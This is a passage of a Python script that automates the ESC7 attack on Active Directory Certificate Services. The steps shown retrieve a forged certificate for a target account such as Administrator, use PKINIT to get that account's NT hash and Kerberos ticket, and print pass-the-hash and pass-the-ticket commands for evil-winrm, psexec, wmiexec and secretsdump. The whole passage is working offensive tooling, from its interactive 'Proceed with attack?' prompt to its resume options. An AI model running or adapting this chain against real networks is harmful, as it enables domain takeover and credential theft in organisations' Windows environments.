                    "Access denied during certificate retrieve.",
                    hint=(
                        "Verify the request is in the correct state and "
                        "the account has the needed permissions."
                    ),
                )
            if (
                "not found" in text.lower()
                or "CERTSRV_E_NO_REQUEST" in text
            ):
                raise StepError(
                    f"Request ID {self.request_id} not found on the CA.",
                    hint=(
                        "Verify the request ID is correct. "
                        "The CA may have been restarted or the request expired."
                    ),
                )

        if log_pfx and os.path.isfile(log_pfx):
            self.pfx_path = log_pfx
        else:
            # Search for most-recently-modified PFX in current directory
            candidates = [
                self.args.pfx_out,
                (self.args.upn or "").split("@")[0] + ".pfx",
                (self.args.upn or "").replace("@", "_") + ".pfx",
            ]
            for c in candidates:
                if c and os.path.isfile(c):
                    self.pfx_path = c
                    break
            else:
                pfx_files = sorted(
                    [f for f in os.listdir(".") if f.lower().endswith(".pfx")],
                    key=os.path.getmtime,
                    reverse=True,
                )
                if pfx_files:
                    self.pfx_path = pfx_files[0]

        if not self.pfx_path or not os.path.isfile(self.pfx_path):
            if retrieve_exception:
                raise StepError(
                    f"Retrieve failed and no PFX found: {retrieve_exception}",
                    hint=(
                        "Verify the request was issued (step 5) and the "
                        "CA FQDN (--target-host) is correct."
                    ),
                )
            raise StepError(
                "No PFX file found after certificate retrieve.",
                hint=(
                    "Check the certipy output above. "
                    f"Expected file: {self.args.pfx_out!r}"
                ),
            )

        try:
            size = os.path.getsize(self.pfx_path)
            if size == 0:
                raise StepError(
                    f"PFX file {self.pfx_path!r} is empty.",
                    hint="The retrieve step may have failed silently.",
                )
        except OSError as e:
            raise StepError(
                f"Cannot stat PFX file {self.pfx_path!r}: {e}"
            ) from e

        _ok(f"Certificate saved: {self.pfx_path}")

    # ── Step 7 ────────────────────────────────────────────────────────────────
    def step_auth(self) -> None:
        _banner("STEP 7: PKINIT Authentication")

        if not self.pfx_path:
            raise ConfigError(
                "No PFX path set — cannot authenticate.",
                hint=(
                    "Run step 6 first, or provide --pfx-out pointing to "
                    "an existing PFX file."
                ),
            )

        if not os.path.isfile(self.pfx_path):
            raise CertificateError(
                f"PFX file not found: {self.pfx_path!r}",
                hint=(
                    "Verify the retrieve step completed successfully. "
                    "You can also point --pfx-out to an existing PFX."
                ),
            )

        _info(f"PFX: {self.pfx_path}")

        target = build_target(
            self.args.user,
            self.args.password,
            self.args.domain,
            self.args.dc_ip,
            self.args.dc_host,
            self.args.kerberos,
            self.args.hashes,
        )

        auth = Authenticate(
            target=target,
            pfx=self.pfx_path,
            username=self.args.upn.split("@")[0],
            domain=self.args.domain,
            no_save=False,
            no_hash=False,
        )
        result = auth.authenticate()

        if result is False:
            raise AuthError(
                "PKINIT authentication returned False.",
                hint=(
                    "Verify the certificate contains a valid UPN SAN and "
                    "the target account exists. Check certipy output above."
                ),
            )

        _ok("PKINIT authentication successful!")

        if auth.nt_hash:
            u = self.args.upn.split("@")[0]
            d = self.args.domain
            h = auth.nt_hash

            print(
                f"\n{C.G}{C.BD}"
                f"  NT Hash: {auth.lm_hash}:{h}"
                f"{C.X}"
            )
            _section("Pass-the-Hash commands")
            print(f"  evil-winrm  -i {self.args.dc_ip} -u {u} -H {h}")
            print(
                f"  psexec.py   {d}/{u}@{self.args.dc_ip} -hashes :{h}"
            )
            print(
                f"  wmiexec.py  {d}/{u}@{self.args.dc_ip} -hashes :{h}"
            )
            print(
                f"  secretsdump.py {d}/{u}@{self.args.dc_ip} -hashes :{h}"
            )

        if auth.ccache_name and os.path.isfile(auth.ccache_name):
            _ok(f"CCACHE: {auth.ccache_name}")
            _section("Pass-the-Ticket commands")
            print(
                f"  export KRB5CCNAME={auth.ccache_name}"
            )
            print(
                f"  psexec.py -k -no-pass {d}/{u}@{self.args.dc_ip}"
            )

    # ── Cleanup ───────────────────────────────────────────────────────────────
    def cleanup(self) -> None:
        if not self.args.cleanup:
            return
        _banner("CLEANUP: Disabling SubCA Template")
        try:
            ca = CA(
                self._target(),
                ca=self.ca_name,
                template=self.args.template,
            )
            ca.disable()
            _ok("SubCA disabled")
        except ESC7Error as e:
            _warn(f"Cleanup failed: {e}")
            if e.hint:
                _hint(e.hint)
        except Exception as e:
            _warn(f"Cleanup error: {e}")

    # ── Summary ───────────────────────────────────────────────────────────────
    def print_summary(self, step_reached: int) -> None:
        print(f"\n{C.H}{'='*70}{C.X}")
        print(f"{C.BD}{C.B}  ATTACK SUMMARY{C.X}")
        print(f"{C.H}{'='*70}{C.X}")
        print(f"  CA Name:      {self.ca_name or 'N/A'}")
        print(f"  CA FQDN:      {self.ca_fqdn or 'N/A'}")
        print(f"  Target UPN:   {self.args.upn}")
        print(f"  Template:     {self.args.template}")
        print(f"  Step Reached: {step_reached}/7")

        if self.issued_immediately:
            print(
                f"  Disposition:  {C.G}Issued immediately "
                f"(steps 5+6 skipped){C.X}"
            )

        if self.request_id:
            print(
                f"  Request ID:   {C.G}{C.BD}{self.request_id}{C.X}"
            )

        if self.pfx_path and os.path.isfile(self.pfx_path):
            size = os.path.getsize(self.pfx_path)
            print(
                f"  PFX File:     {self.pfx_path} "
                f"({size} bytes)"
            )

        if step_reached < 7 and self.request_id and step_reached >= 4:
            print(
                f"\n  {C.Y}Resume command:{C.X}"
            )
            print(
                f"    python3 {sys.argv[0]} "
                f"--start-from {step_reached + 1} "
                f"--request-id {self.request_id}"
            )
        print(f"{C.H}{'='*70}{C.X}\n")

    # ── Main runner ───────────────────────────────────────────────────────────
    def run(self) -> None:
        steps = [
            (1, "CA Discovery",   self.step_discover_ca),
            (2, "Add Officer",    self.step_add_officer),
            (3, "Enable SubCA",   self.step_enable_template),
            (4, "Request Cert",   self.step_request),
            (5, "Issue Request",  self.step_issue),
            (6, "Retrieve Cert",  self.step_retrieve),
            (7, "Authenticate",   self.step_auth),
        ]
        start        = self.args.start_from
        last_success = start - 1

        for num, name, func in steps:
            if num < start:
                _info(
                    f"Skipping step {num} ({name}) "
                    f"— --start-from {start}"
                )
                continue

            try:
                if num == 4:
                    self.request_id = func()
                else:
                    func()
                last_success = num

            except KeyboardInterrupt:
                print()
                _warn(f"Step {num} ({name}) interrupted by user.")
                self.print_summary(last_success)
                sys.exit(130)

            except ESC7Error as e:
                _err(f"Step {num} ({name}) failed: {e}")
                if e.hint:
                    _hint(e.hint)
                if self.debug:
                    tb.print_exc()
                self.print_summary(last_success)
                sys.exit(1)

            except Exception as e:
                _err(
                    f"Step {num} ({name}) raised unexpected exception: "
                    f"{type(e).__name__}: {e}"
                )
                _hint("Run with --debug for a full traceback.")
                if self.debug:
                    tb.print_exc()
                self.print_summary(last_success)
                sys.exit(1)

        _ok("ESC7 chain complete!")
        self.print_summary(7)
        self.cleanup()

def collect_interactive(args) -> argparse.Namespace:
    print(f"{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.BD}{C.B}║  ESC7 ADCS ATTACK CHAIN                                                      ║{C.X}")
    print(f"{C.BD}{C.B}║  Active Directory Certificate Services — ESC7 Exploitation                   ║{C.X}")
    print(f"{C.BD}{C.B}║                                                                              ║{C.X}")
    print(f"{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}")

    try:
        if not args.user:
            args.user = _prompt(
                "Username (with ManageCA rights)",
                validator=lambda s: bool(s.strip()),
                error_msg="Username cannot be empty.",
            )

        # Infer domain from username early
        if not args.domain:
            if "@" in (args.user or ""):
                args.domain = args.user.split("@", 1)[1]
            elif "\\" in (args.user or ""):
                args.domain = args.user.split("\\", 1)[0]

        # Auth method
        if not args.password and not args.hashes and not args.kerberos:
            print("\n  Auth method:")
            print("    [1] Password")
            print("    [2] Pass-the-Hash (LM:NT)")
            print("    [3] Kerberos (-k)")
            try:
                choice = _prompt("  Select", default="1")
            except KeyboardInterrupt:
                sys.exit(0)

            if choice == "2":
                args.hashes = _prompt(
                    "  Hashes (LM:NT)",
                    validator=lambda s: ":" in s,
                    error_msg="Hashes must be in LM:NT format.",
                )
            elif choice == "3":
                args.kerberos = True
            else:
                args.password = _prompt(
                    "  Password", sensitive=True,
                    validator=lambda s: len(s) > 0,
                    error_msg="Password cannot be empty.",
                )

        if not args.dc_ip:
            args.dc_ip = _prompt(
                "DC IP",
                validator=_is_valid_ip,
                error_msg="Enter a valid IP address or hostname.",
            )

        if not args.domain:
            args.domain = _prompt(
                "Domain (e.g. domain.com)",
                validator=_is_valid_domain,
                error_msg="Domain must contain a dot and no @ sign.",
            )

        if not args.upn:
            args.upn = _prompt(
                "Target UPN (e.g. Administrator@domain.com)",
                validator=_is_valid_upn,
                error_msg="UPN must be in user@domain.tld format.",
            )

        # Warn if target_host looks like a UPN
        if args.target_host and "@" in args.target_host:
            _warn(
                "--target-host looks like a UPN (" + repr(args.target_host) + "). "
                "It must be the CA server FQDN (e.g. WIN-XYZ.domain.com)."
            )
            args.target_host = None

        if not args.target_host:
            _warn(
                "CA FQDN (target-host) not provided — "
                "will be auto-discovered from LDAP in step 1."
            )

        if not args.dc_host:
            args.dc_host = args.dc_ip

        if not args.ca:
            _warn("CA name not provided — will auto-discover in step 1.")

        if not args.officer:
            default_officer = (
                (args.user or "").split("@")[0].split("\\")[-1]
            )
            args.officer = _prompt_optional(
                "  Officer account", default=default_officer
            ) or default_officer

        if not args.pfx_out:
            default_pfx  = (
                (args.upn or "administrator").split("@")[0] + ".pfx"
            )
            args.pfx_out = _prompt_optional(
                "  Output PFX filename", default=default_pfx
            ) or default_pfx

        # Validate PFX output path
        if not _validate_pfx_path(args.pfx_out):
            _warn(
                "Output path " + repr(args.pfx_out) + " may not be writable. "
                "Continuing — the write will fail if permissions are wrong."
            )

        # Summary
        print("\n" + C.H + "="*70 + C.X)
        print(C.B + "  Configuration:" + C.X)
        print("    User:        " + str(args.user))
        print("    Domain:      " + str(args.domain))
        print("    DC IP:       " + str(args.dc_ip))
        print("    CA:          " + (args.ca or "<auto-discover>"))
        print("    Target Host: " + (args.target_host or "<auto-discover>"))
        print("    UPN:         " + str(args.upn))
        print("    Officer:     " + str(args.officer))
        print("    PFX Out:     " + str(args.pfx_out))
        print(C.H + "="*70 + C.X + "\n")

        if not _prompt_bool("  Proceed with attack?", default=True):
            _info("Aborted by user.")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n" + C.Y + "[!] Setup interrupted by user." + C.X)
        sys.exit(130)

    return args

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "ESC7 Full Attack Chain — handles both immediate and "
            "pending certificate issuance."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 esc7_unified.py
  python3 esc7_unified.py -u ca-admin@domain.com -p Password1 \\
      --dc-ip 192.168.10.30 --upn Administrator@domain.com
  python3 esc7_unified.py ... --start-from 5 --request-id 37
        """,
    )

    g = parser.add_argument_group("Authentication")
    g.add_argument("-u", "--user",     metavar="USER",   help="Username")
    g.add_argument("-p", "--password", metavar="PASS",   help="Password")
    g.add_argument("--hashes",         metavar="LM:NT",  help="NTLM hashes")
    g.add_argument(
        "-k", "--kerberos", action="store_true", help="Use Kerberos"
    )
    g.add_argument("--aes-key", metavar="HEX", help="AES key for Kerberos")

    g = parser.add_argument_group("Target")
    g.add_argument("--dc-ip",   metavar="IP",   help="Domain controller IP")
    g.add_argument("--dc-host", metavar="FQDN", help="DC hostname (Kerberos)")
    g.add_argument(
        "--ca",     metavar="NAME",
        help="CA name (auto-discovered if omitted)",
    )
    g.add_argument(
        "--domain", metavar="DOMAIN",
        help="Domain (inferred from username/UPN if omitted)",
    )

    g = parser.add_argument_group("ESC7")
    g.add_argument(
        "--target-host", metavar="FQDN",
        help="CA server FQDN (auto-discovered if omitted)",
    )
    g.add_argument("--upn",      metavar="UPN",    help="UPN to impersonate")
    g.add_argument(
        "--template", default="SubCA", metavar="NAME",
        help="Certificate template name (default: SubCA)",
    )
    g.add_argument(
        "--officer", metavar="USER",
        help="Officer account (default: current user)",
    )
    g.add_argument(
        "--pfx-out", default="administrator.pfx", metavar="FILE",
        help="Output PFX filename",
    )
    g.add_argument("--subject", metavar="DN", help="Custom certificate subject")

    g = parser.add_argument_group("Control")
    g.add_argument(
        "--start-from",
        type=int, default=1, choices=range(1, 8),
        metavar="N", help="Resume from step N (1-7, default: 1)",
    )
    g.add_argument(
        "--request-id",
        type=int, metavar="ID",
        help="Request ID (required when --start-from >= 5)",
    )
    g.add_argument(
        "--skip-precheck", action="store_true",
        help="Skip network connectivity pre-checks",
    )
    g.add_argument(
        "--cleanup", action="store_true",
        help="Disable SubCA template after attack",
    )
    g.add_argument("--timeout",         type=int, default=5)
    g.add_argument("--non-interactive", action="store_true")
    g.add_argument("--debug",           action="store_true")

    args = parser.parse_args()

    # Determine if interactive mode is needed
    has_auth = bool(args.password or args.hashes or args.kerberos)
    required = [args.user, args.dc_ip, args.upn]

    if not all(required) or not has_auth:
        if args.non_interactive:
            parser.error(
                "Missing required arguments. In non-interactive mode provide: "
                "-u USER, (-p PASS | --hashes LM:NT | -k), "
                "--dc-ip IP, --upn UPN"
            )
        args = collect_interactive(args)

    # Validate resume requirements
    if args.start_from >= 5 and not args.request_id:
        if args.non_interactive:
            parser.error(
                "--request-id is required when --start-from >= 5"
            )
        _warn("--request-id is required to resume from step 5 or later.")
        while True:
            raw = input("  Request ID: ").strip()
            if raw.isdigit() and int(raw) > 0:
                args.request_id = int(raw)
                break
            _warn("Enter a positive integer.")

    # Infer domain
    if not args.domain:
        for src in (args.upn, args.user):
            if src and "@" in src:
                args.domain = src.split("@", 1)[1]
                break
        if not args.domain and args.user and "\\" in args.user:
            args.domain = args.user.split("\\", 1)[0]

    if not args.domain:
        if args.non_interactive:
            parser.error("Cannot determine domain. Provide --domain.")
        args.domain = _prompt(
            "Domain",
            validator=_is_valid_domain,
            error_msg="Domain must contain a dot.",
        )

    # Warn about UPN in target_host
    if args.target_host and "@" in args.target_host:
        _warn(
            f"--target-host appears to be a UPN ({args.target_host!r}). "
            f"It will be ignored and auto-discovered from LDAP."
        )
        args.target_host = None

    return args

def main() -> None:
    args = parse_args()

    level = py_logging.DEBUG if args.debug else py_logging.WARNING
    py_logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    print(f"{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.BD}{C.B}║  ESC7 ADCS ATTACK CHAIN                                                      ║{C.X}")
    print(f"{C.BD}{C.B}║  Active Directory Certificate Services — ESC7 Exploitation                   ║{C.X}")
    print(f"{C.BD}{C.B}║                                                                              ║{C.X}")
    print(f"{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}")

    # Pre-flight connectivity check
    if not args.skip_precheck:
        try:
            ca_host = args.target_host or ""
            precheck_connectivity(args.dc_ip, ca_host)
        except KeyboardInterrupt:
            print("\n" + C.Y + "[!] Interrupted by user during connectivity check." + C.X)
            sys.exit(130)
        except NetworkError as e:
            _err(str(e))
            if e.hint:
                _hint(e.hint)
            _warn(
                "Use --skip-precheck to bypass this check if you are "
                "confident the target is reachable."
            )
            sys.exit(1)
    else:
        _warn("Skipping connectivity pre-checks (--skip-precheck).")

    attack = ESC7Attack(args)

    if args.request_id:
        attack.request_id = args.request_id
        _info(f"Resuming with Request ID: {args.request_id}")

    try:
        attack.run()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted by user.{C.X}")
        attack.print_summary(0)
        sys.exit(130)
    except ESC7Error as e:
        _err(f"Fatal: {e}")
        if e.hint:
            _hint(e.hint)
        if args.debug:
            tb.print_exc()
        attack.print_summary(0)
        sys.exit(1)
    except SystemExit:
        raise
    except Exception as e:
        _err(f"Unexpected fatal error: {type(e).__name__}: {e}")
        _hint("Run with --debug for a full traceback.")
        if args.debug:
            tb.print_exc()
        attack.print_summary(0)
        sys.exit(1)

if __name__ == "__main__":
    main()
